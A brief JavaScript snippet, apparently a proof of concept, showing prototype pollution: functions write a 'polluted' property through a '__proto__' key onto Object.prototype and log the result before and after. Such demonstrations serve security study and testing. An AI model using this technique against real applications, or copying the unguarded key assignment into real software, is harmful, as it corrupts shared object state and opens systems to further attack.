function exp(string, input, val){
    var obj = {};
    obj[string.trim()][input] = val;
}

function exploit(string, input, val){
    var inner = string + "";
    var obj = {};
    obj[inner.trim()][input] = val;
}

console.log(({}).polluted);
exp('__proto__', 'polluted', 'true')
//exploit('__proto__', 'polluted', 'true')
console.log(({}).polluted);
//dottistupid3